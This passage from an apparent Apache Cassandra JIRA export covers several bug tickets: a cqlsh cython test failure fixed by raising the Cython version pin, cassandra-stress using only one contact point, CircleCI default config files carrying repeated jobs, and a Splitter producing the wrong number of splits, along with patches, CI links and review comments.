But cython compile failures arise where an updated is [suggested|https://github.com/cython/cython/issues/1943]",,bereng,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16809,,,,,,,,,,,,,,,,,,,,CASSANDRA-18001,,CASSANDRA-18036,,,,,,,,,,0.0,bereng,mck,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Nov 11 06:11:24 UTC 2022,,,,,,,All,,,,"0|z1bv34:",9223372036854775807,,,,bereng,,,,Normal,,3.0.26,,https://github.com/apache/cassandra/commit/d9ef794ef6a03c2d7e0b1476cc0d29a008040095 https://github.com/apache/cassandra-builds/commit/16a025c86ede72e04a6cf32d2cc1d989c2b74e02,,,,,,,,,CI,,,,,"10/Nov/22 10:55;bereng;Local repro is possible by setting env variable {{cython=true}}

Updating cython passes the first compile error but will fail on

{noformat}
      creating build/temp.linux-x86_64-cpython-38
      creating build/temp.linux-x86_64-cpython-38/tmp
      creating build/temp.linux-x86_64-cpython-38/tmp/pip-install-hanwn85r
      creating build/temp.linux-x86_64-cpython-38/tmp/pip-install-hanwn85r/cython_ab93e879789241a999b84482cf72a4ac
      creating build/temp.linux-x86_64-cpython-38/tmp/pip-install-hanwn85r/cython_ab93e879789241a999b84482cf72a4ac/Cython
      creating build/temp.linux-x86_64-cpython-38/tmp/pip-install-hanwn85r/cython_ab93e879789241a999b84482cf72a4ac/Cython/Plex
      x86_64-linux-gnu-gcc -pthread -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O2 -Wall -g -fstack-protector-strong -Wformat -Werror=format-security -g -fwrapv -O2 -fPIC -I/home/bereng/work/repos/bdpWS/cython/pylib/venv/include -I/usr/include/python3.8 -c /tmp/pip-install-hanwn85r/cython_ab93e879789241a999b84482cf72a4ac/Cython/Plex/Scanners.c -o build/temp.linux-x86_64-cpython-38/tmp/pip-install-hanwn85r/cython_ab93e879789241a999b84482cf72a4ac/Cython/Plex/Scanners.o
      /tmp/pip-install-hanwn85r/cython_ab93e879789241a999b84482cf72a4ac/Cython/Plex/Scanners.c:19:10: fatal error: Python.h: No such file or directory
         19 | #include ""Python.h""
            |          ^~~~~~~~~~
      compilation terminated.
      error: command '/usr/bin/x86_64-linux-gnu-gcc' failed with exit code 1
      [end of output]
{noformat}

for diff


{noformat}
diff --git a/pylib/cassandra-cqlsh-tests.sh b/pylib/cassandra-cqlsh-tests.sh
index d0448fabd0..498e5c760e 100755
--- a/pylib/cassandra-cqlsh-tests.sh
+++ b/pylib/cassandra-cqlsh-tests.sh
@@ -78,7 +78,7 @@ pip freeze
 
 if [ ""$cython"" = ""yes"" ]; then
     TESTSUITE_NAME=""${TESTSUITE_NAME}.cython""
-    pip install ""Cython>=0.20,<0.25""
+    pip install ""Cython>=0.20,<=0.29""
     cd pylib/; python setup.py build_ext --inplace
     cd ${WORKSPACE}
 else

{noformat}

;;;","10/Nov/22 12:51;mck;Patches
 - 3.0 – https://github.com/apache/cassandra/compare/cassandra-3.0...thelastpickle:cassandra:mck/cython-upgrade/3.0
 - 3.11 – https://github.com/apache/cassandra/compare/cassandra-3.11...thelastpickle:cassandra:mck/cython-upgrade/3.11
 - 4.0 – https://github.com/apache/cassandra/compare/cassandra-4.0...thelastpickle:cassandra:mck/cython-upgrade/4.0
 - 4.1 – https://github.com/apache/cassandra/compare/cassandra-4.1...thelastpickle:cassandra:mck/cython-upgrade/4.1
 - trunk – https://github.com/apache/cassandra/compare/trunk...thelastpickle:cassandra:mck/cython-upgrade/trunk
 - cassandra-builds – https://github.com/apache/cassandra-builds/pull/83

CI
- 3.0 – https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/12
- 3.11 – https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/11
- 4.0 – https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/10
- 4.1 – https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/8
- trunk – https://ci-cassandra.apache.org/job/Cassandra-trunk-cqlsh-t2/7/;;;","10/Nov/22 13:18;bereng;All patches are correct. The min and ceiling versions for cython are correct. All CI runs have cython where it should and it's not present where it shouldn't.+1 LGTM;;;","10/Nov/22 13:49;mck;Committed as [d9ef794ef6a03c2d7e0b1476cc0d29a008040095|https://github.com/apache/cassandra/commit/d9ef794ef6a03c2d7e0b1476cc0d29a008040095] and [16a025c86ede72e04a6cf32d2cc1d989c2b74e02| https://github.com/apache/cassandra-builds/commit/16a025c86ede72e04a6cf32d2cc1d989c2b74e02].;;;","11/Nov/22 05:56;bereng;Mmmm somehow the 4.0 CI run had some parts pointing at the 3.11 branch. 4.0 cython seems to be failing as [~e.dimitrova]  found out [here.|https://ci-cassandra.apache.org/job/Cassandra-4.0-cqlsh-tests/456/cython=yes,jdk=jdk_1.8_latest,label=cassandra/console]

I checked and all other CI runs are corrrect. Investigating...;;;","11/Nov/22 06:11;bereng;{{import errno}} is missing in {{cqlshlib/copyutil.py}}

See CASSANDRA-18036;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cassandra-stress: not all contact point are passed down to driver,CASSANDRA-18025,13499746,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,fruch,fruch,08/Nov/22 15:23,28/May/23 17:14,13/Jul/23 08:40,19/May/23 18:22,3.0.30,3.11.16,4.0.10,4.1.2,5.0,,Tool/stress,,,,0,,"Seem like c-s is randomly selecting a node from the nodes passed down to it in the command line, and use that node as contact point to the driver.

 

When using c-s together with other management operations (for example expending/shrinking the cluster), we can get into situation some of the nodes mentioned in the command line aren't reachable/available, and c-s instead of applying the best practice of having multiple contact points, pass down only one that can be unavailable and fail completely without trying any of the other nodes mentioned in the command line

we just fixed that in our fork of cassandra-stress:

[https://github.com/scylladb/scylla-tools-java/pull/314]

 ",,brandon.williams,fruch,smiklosovic,,,,,,,,,,,,"fruch opened a new pull request, #1989:
URL: https://github.com/apache/cassandra/pull/1989

   …own to driver
   
   Seem like c-s is randomly selecting a node from the nodes passed down to it in the command line, and use that node as contact point to the driver. When using c-s together with other management operations (for example expending/shrinking the cluster),
   
   we can get into situation some of the nodes mentioned in the command line aren't reachable/available, and c-s instead of applying the best practices of having multiple contact points, pass down only one that can be unavailable and fail completely without trying any of the other nodes mentioned in the command line.
   
   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;08/Nov/22 15:25;githubbot;600","smiklosovic closed pull request #1989: CASSANDRA-18025: cassandra-stress: not all contact point are passed down to driver
URL: https://github.com/apache/cassandra/pull/1989


;28/May/23 17:14;githubbot;600","smiklosovic closed pull request #2343: CASSANDRA-18025
URL: https://github.com/apache/cassandra/pull/2343


;28/May/23 17:14;githubbot;600","smiklosovic closed pull request #2344: CASSANDRA-18025 4.1
URL: https://github.com/apache/cassandra/pull/2344


;28/May/23 17:14;githubbot;600","smiklosovic closed pull request #2345: CASSANDRA-18025 4.0
URL: https://github.com/apache/cassandra/pull/2345


;28/May/23 17:14;githubbot;600","smiklosovic closed pull request #2346: CASSANDRA-18025 3.11
URL: https://github.com/apache/cassandra/pull/2346


;28/May/23 17:14;githubbot;600","smiklosovic closed pull request #2347: CASSANDRA-18025 3.0
URL: https://github.com/apache/cassandra/pull/2347


;28/May/23 17:14;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4200,,,0,4200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness -> Transient Incorrect Response,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri May 19 13:36:59 UTC 2023,,,,,,,All,,,,"0|z1bo3s:",9223372036854775807,,,,brandon.williams,,,,Normal,,3.0.0,,https://github.com/apache/cassandra/commit/b828f7ea1b735586da388ddfee17f26685e20cef,,,,,,,,,CI,,,,,"21/Nov/22 08:02;smiklosovic;[~brandon.williams] what do you think about this? It is ok that it fixes the connection when one node is down, on the other hand, should not be a user notified about that node being down before a stress test starts? In that sense, it is good that it fails. I would not want to start my stress test on a three node cluster when one of the nodes is down and I do not know it.

[~fruch] could you please expand your thinking around ""management operation / expanding / shrinking""? Is it common for you to perform a stress test on a cluster which changes its topology? Why would expanding of a cluster make the driver not being able to connect to a node which was there already?;;;","28/Nov/22 16:51;brandon.williams;I think the driver probably does notify that the node it tried was down?  ;;;","28/Nov/22 17:13;fruch;[~smiklosovic] the idea is that we are using cassandra-stress during complex test cases, in which at any given time one of the nodes might be affect by a ChaosMonkey style experiment/fault. in those situation we might start cassandra-stress with a list of nodes, which one of them is down. and it's part of what we are testing.

other stress tools we are using, doesn't suffer from this issue, since they are passing all contact points down to their driver code.

The whole idea is to let user run the stress tool also on cluster which are not fully functioning, as long as you doing CQL command in QUORUM for example, you have guarantee it should work, isn't that what Cassandra advertise ? :)

Anyhow randomly picking one of the nodes doesn't  guarantees  that all of them are working, just that this one that was selected is up. 

[~brandon.williams] the driver is aware that nodes goes down, but I don't think cassandra-stress is listen to those. (but it's visible you turn on some of the driver debug levels)

And again, all production code will be using multiple contact points (for exactly the reason I've described), I think tooling and tests should act as close to production behavior as possible.

 ;;;","18/May/23 12:53;smiklosovic;trunk https://github.com/apache/cassandra/pull/2343
4.1 https://github.com/apache/cassandra/pull/2344
4.0 https://github.com/apache/cassandra/pull/2345
3.11 https://github.com/apache/cassandra/pull/2346
3.0 https://github.com/apache/cassandra/pull/2347

I ll add builds soon.;;;","19/May/23 07:26;smiklosovic;3.0 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2239/workflows/2358d608-7756-4b94-ba84-bd3eb5104e57
3.11 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2238/workflows/8ab419e4-96e0-42a8-8be3-cbba634a2d48
4.0 j8 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2237/workflows/b22a3b8c-4de3-4d48-a3f0-9d44a7dd316d
4.0 j11 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2237/workflows/9c090b86-9493-4536-8e4b-a3a58dca716a
4.1 j11 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2236/workflows/9f17a644-d5f6-4018-b169-e1e99b363d47
4.1 j8 https://app.circleci.com/pipelines/github/instaclustr/cassandra/2236/workflows/431febd5-d0f4-42e7-b694-49245f53ce04
trunk TBD

[~brandon.williams] I would appreciated if you run trunk for me - this branch https://app.circleci.com/pipelines/github/instaclustr/cassandra?branch=CASSANDRA-18025

4.1 is still running as I write this. I believe that if all is nice I would be able to merge this today evening UTC if you help with trunk. Thanks.

I also manually tested this on trunk and it behaves nicely. If I run a stress against 3 nodes and turn off one of them, it just continues fine which can not be told about the current solution. 

There is also -nodes file=path flag to specify nodes in a file, one per line. A user would expect that all three nodes are used but that is not true, just random one, which is misleading (without this patch merged).;;;","19/May/23 08:04;fruch;[~smiklosovic] I can add we are using this in scylla for testing for the last 6 months, with no issues.

 

The thing you want to be testing is that c-s is *starting* even if some nodes are down.

 

Anyhow thanks for moving this forward.;;;","19/May/23 08:41;smiklosovic;Sure, that indeed works as well.;;;","19/May/23 10:07;brandon.williams;I started trunk: 

||Branch||CI||
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-18025-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/1007/workflows/9928cc55-44c8-4901-9af4-4b71422fc058], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/1007/workflows/c3ce5a76-162b-4f92-9887-56a6af01efe0]|
;;;","19/May/23 13:01;smiklosovic;All is finished. I think we are good!;;;","19/May/23 13:36;brandon.williams;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Circle repeated jobs shouldn't appear on default config files,CASSANDRA-18024,13499641,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,bereng,bereng,08/Nov/22 09:52,09/Nov/22 06:24,13/Jul/23 08:40,08/Nov/22 17:57,3.0.29,3.11.15,4.0.8,4.1-rc1,5.0,,CI,,,,0,,"It seems that when pushing a PR, the auto multiplexing of new tests triggers all multiplexing jobs, even if there are no tests present for that job.

That is wasteful as it means spinning up many nodes etc for nothing.",,adelapena,bereng,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,CASSANDRA-18007,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Nov 09 06:24:37 UTC 2022,,,,,,,All,,,,"0|z1bngg:",9223372036854775807,,,,bereng,e.dimitrova,,,Low,,3.0.28,,https://github.com/apache/cassandra/commit/955231cacfc2732dd1fd4275049e224ab220d107,,,,,,,,,"Patches and CI for all branches:
||Patch||Default LOWRES||Default MIDRES||Default HIGHRES||MIDRES multiplexer||
|[3.0 |https://github.com/apache/cassandra/compare/cassandra-3.0...adelapena:18024-3.0]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.0-test-low]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.0-test-mid]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.0-test-high]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.0-test-multiplexer]|
|[3.11 |https://github.com/apache/cassandra/compare/cassandra-3.11...adelapena:18024-3.11]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.11-test-low]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.11-test-mid]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.11-test-high]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.11-test-multiplexer]|
|[4.0 |https://github.com/apache/cassandra/compare/cassandra-4.0...adelapena:18024-4.0]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.0-test-low]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.0-test-mid]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.0-test-high]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.0-test-multiplexer]|
|[4.1 |https://github.com/apache/cassandra/compare/cassandra-4.1...adelapena:18024-4.1]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.1-test-low]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.1-test-mid]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.1-test-high]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.1-test-multiplexer]|
|[trunk|https://github.com/apache/cassandra/compare/trunk...adelapena:18024-trunk]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-low]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-mid]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-high]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-multiplexer]|",,,,,"08/Nov/22 09:53;bereng;See an example here: https://app.circleci.com/pipelines/github/michaelsembwever/cassandra/36/workflows/d0d3539e-b760-4729-b8f0-e5a03bf6c159/jobs/812;;;","08/Nov/22 12:25;adelapena;It seems that the problem is that {{.circleci/generate.sh}} only removes the repeated jobs in {{config.yml}}, but not in {{config.yml.LOWRES}}, {{config.yml.MIDRES}} and {{config.yml.HIGHRES}}. So manually renaming any of those to {{config.yml}} instead of using {{generate.sh}} will include all the empty repeated jobs, which is wrong.

Note that not using {{generate.sh}} will also skip the detection of new or modified tests. That's not a bug.

Fix for trunk [here|https://github.com/apache/cassandra/compare/trunk...adelapena:18024-trunk], I'll add CI and patches for the other branches later today.;;;","08/Nov/22 12:46;bereng;[~adelapena] wdyt about adding a job to configs that would fail with a message saying 'Caution: manually copying the file will skip auto multiplexing runs bla bla bla? Please use generate.sh instead.'. Generate.sh could remove it. That would protect us from the wall of green that didn't actually multiplex anything and the other problems;;;","08/Nov/22 13:06;adelapena;||Patch||Default LOWRES||Default MIDRES||Default HIGHRES||MIDRES multiplexer||
|[trunk|https://github.com/apache/cassandra/compare/trunk...adelapena:18024-trunk]​|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-low]​|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-mid]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-high]​|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-multiplexer]​|;;;","08/Nov/22 13:30;bereng;As far as removal of repeated jobs from the files goes the approach lgtm. I would still make default files fail with some message for extra safety. I can do  that in another ticket if you're too far down the rabbit hole with this one and don't want to redo the gazillion branches/files.;;;","08/Nov/22 13:36;adelapena;Patches and CI for all branches:

||Patch||Default LOWRES||Default MIDRES||Default HIGHRES||MIDRES multiplexer||
|[3.0  |https://github.com/apache/cassandra/compare/cassandra-3.0...adelapena:18024-3.0]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.0-test-low]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.0-test-mid]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.0-test-high]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.0-test-multiplexer]|
|[3.11 |https://github.com/apache/cassandra/compare/cassandra-3.11...adelapena:18024-3.11]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.11-test-low] |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.11-test-mid] |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.11-test-high] |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-3.11-test-multiplexer]|
|[4.0  |https://github.com/apache/cassandra/compare/cassandra-4.0...adelapena:18024-4.0]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.0-test-low]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.0-test-mid]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.0-test-high]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.0-test-multiplexer]|
|[4.1  |https://github.com/apache/cassandra/compare/cassandra-4.1...adelapena:18024-4.1]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.1-test-low]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.1-test-mid]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.1-test-high]  |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-4.1-test-multiplexer]|
|[trunk|https://github.com/apache/cassandra/compare/trunk...adelapena:18024-trunk]        |[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-low]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-mid]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-high]|[link|https://app.circleci.com/pipelines/github/adelapena/cassandra?branch=18024-trunk-test-multiplexer]|
;;;","08/Nov/22 14:00;adelapena;Thanks for the quick review. I have posted CI for the rest of the branches. [~e.dimitrova] do you want to take a look? We should coordinate in which order we merge to reduce rebase pains. This one is quite simple, I'd say.
{quote}wdyt about adding a job to configs that would fail with a message saying 'Caution: manually copying the file will skip auto multiplexing runs bla bla bla? Please use generate.sh instead.'. Generate.sh could remove it. That would protect us from the wall of green that didn't actually multiplex anything and the other problems
{quote}
At the moment using those files is considered legitimate IMO, otherwise we wouldn't have them. I think we shouldn't fail CI just to print a message that the user might already be aware of. Not sure about how else we could print a warning without resorting to adding a specific job and failing the entire workflow.

Also, note that the automatic detection of modified test is not a guarantee that all relevant tests have been selected or run, and we'll always need human supervision to verify that everything is included and actually run. The automatic detection is just a helper so we don't have to write the parameters, but IMO both assignee a reviewers should always take a look at what has been run.

Another question is whether we want to provide the default files with different resource configs at all, or just make using the script mandatory. I think I wouldn't be against removing them, and maybe provide only the default {{config.yml}} that uses lowres for newcomers.
{quote}I can do that in another ticket if you're too far down the rabbit hole with this one and don't want to redo the gazillion branches/files
{quote}
I'd definitively do/discuss that in a separate ticket.;;;","08/Nov/22 15:34;e.dimitrova;So my understanding - we completely remove the repeated jobs from LOWRES, MIDRES and HIGHRES files. If someone wants to take advantage of those - they should use generate.sh as described in the readme. Sounds neat and non-controversial to me. Post-processing those 3 files instead of using the script sounds terribly inefficient to me.

All links but trunk in the patch column are broken. Not an issue for me, I easily found them from CircleCI but you might want to update the table for future reference.
{quote}We should coordinate in which order we merge to reduce rebase pains. This one is quite simple, I'd say.
{quote}
Thanks! Well, if you are all in all completely ready here, I'd say commit it and I will rebase before doing the patches in the other one. But I truly appreciate you trying to coordinate the efforts here. :)
{quote}At the moment using those files is considered legitimate IMO, otherwise we wouldn't have them. I think we shouldn't fail CI just to print a message that the user might already be aware of. Not sure about how else we could print a warning without resorting to adding a specific job and failing the entire workflow.

Also, note that the automatic detection of modified test is not a guarantee that all relevant tests have been selected or run, and we'll always need human supervision to verify that everything is included and actually run. The automatic detection is just a helper so we don't have to write the parameters, but IMO both assignee a reviewers should always take a look at what has been run.
{quote}
+1

 I'd definitively do/discuss that in a separate ticket.

 

+1 All good discussions but I would like to appeal to postpone more CI improvements for after the 4.1 release. We are almost ready to commit last patches to have CirlceCI ready for release. Let's focus on that and then we can continue with incremental improvements. I am sure there are plenty of them we can do and I am all in for great user experience but we need to be reasonable too. And the current look of CircleCI already went a long road compared to where we were last year . 

Overall, I am +1 to commit the current patch, thanks!

I verified I don't see anything else except repeated jobs being deleted in GitHub, workflows also do not expose any repeated jobs at the moment (except the multiplexer which shows only expected runs). I ran locally generate.sh with the different flags for trunk and things were fine. (assuming I did not see other custom changes in generate.sh in the other branches);;;","08/Nov/22 16:22;e.dimitrova;Just got a +1 offline from [~bereng]. We can leave the warning he suggested for a follow up ticket. Thanks;;;","08/Nov/22 16:27;e.dimitrova;{quote}I think I wouldn't be against removing them, and maybe provide only the default {{config.yml}} that uses lowres for newcomers.
{quote}
CASSANDRA-18012 - I believe this is the ticket we can move this topic discussion to. So far paid and free is what was agreed (instead of MIDRES, HIGHRES, LOWRES);;;","08/Nov/22 17:08;adelapena;Thanks for checking on this.

{quote}
All links but trunk in the patch column are broken. Not an issue for me, I easily found them from CircleCI but you might want to update the table for future reference.
{quote}
Fixed. Actually the links on the table were correct, but I forgot to push the {{18024-3.0}}, etc. patch branches. The CI runs point to separate branches named {{18024-3.0-test-low}}, {{18024-3.0-test-multiplexer}}, etc. that are forked from the patch branches.

{quote}
CASSANDRA-18012 - I believe this is the ticket we can move this topic discussion to. So far paid and free is what was agreed (instead of MIDRES, HIGHRES, LOWRES)
{quote}

Yep, we can follow the discussion there. So far it's looking like the days of the multiple default config files are numbered.
;;;","08/Nov/22 17:56;adelapena;Committed to 3.0 as [955231cacfc2732dd1fd4275049e224ab220d107|https://github.com/apache/cassandra/commit/955231cacfc2732dd1fd4275049e224ab220d107] and merged to [3.11|https://github.com/apache/cassandra/commit/7b7762826e367b2a82ba1e99b12f8f19c583b920], [4.0|https://github.com/apache/cassandra/commit/cea850d67d5b726fe7ca9fef39c8578b46210155], [4.1|https://github.com/apache/cassandra/commit/6f431c13a6694173b12c62770b889ad09b9598b4] and [trunk|https://github.com/apache/cassandra/commit/af3eea7558e4da3976def20ac78070e79f8165f3].

Thanks for the reviews.;;;","09/Nov/22 06:24;bereng;Thx for all the hard work!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Splitter sometimes creates different number of splits than requested,CASSANDRA-18013,13494694,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jlewandowski,jlewandowski,jlewandowski,03/Nov/22 15:41,16/Dec/22 21:47,13/Jul/23 08:40,09/Nov/22 16:29,3.11.15,4.0.8,4.1,4.1-rc1,5.0,,Local/Compaction,,,,0,,"{{Splitter}} in some cases may produce one split more than requested. When it happens, it  fails with assertion error when assertions are enabled.

Test to reproduce the issue:

{code:java}
        Splitter splitter = getSplitter(Murmur3Partitioner.instance);
        long lt = 0;
        long rt = 31;
        Range<Token> range = new Range<>(getWrappedToken(Murmur3Partitioner.instance, BigInteger.valueOf(lt)),
                                         getWrappedToken(Murmur3Partitioner.instance, BigInteger.valueOf(rt)));

        for (int i = 1; i <= (rt - lt); i++)
        {
            List<Token> splits = splitter.splitOwnedRanges(i, Arrays.asList(new Splitter.WeightedRange(1.0d, range)), false);
            logger.info(""{} splits of {} are: {}"", i, range, splits);
            Assertions.assertThat(splits).hasSize(i);
        }
{code}

",,e.dimitrova,jlewandowski,marcuse,,,,,,,,,,,,"jacek-lewandowski opened a new pull request, #1968:
URL: https://github.com/apache/cassandra/pull/1968

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;03/Nov/22 16:32;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jlewandowski,,,,,,,,,,,,,,Correctness -> Consistency,,,,,,,,Normal,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Nov 08 08:35:45 UTC 2022,,,,,,,All,,,,"0|z1asxk:",9223372036854775807,,,,marcuse,,,,Normal,,3.2,,https://github.com/apache/cassandra/commit/9213335f59293926b2d643fa8a156a882495dd42,,,,,,,,,run regressions,,,,,"03/Nov/22 16:31;jlewandowski;https://github.com/apache/cassandra/pull/1968 (3.11);;;","07/Nov/22 07:49;marcuse;+1;;;","08/Nov/22 08:35;jlewandowski;||PR||j8||j11||
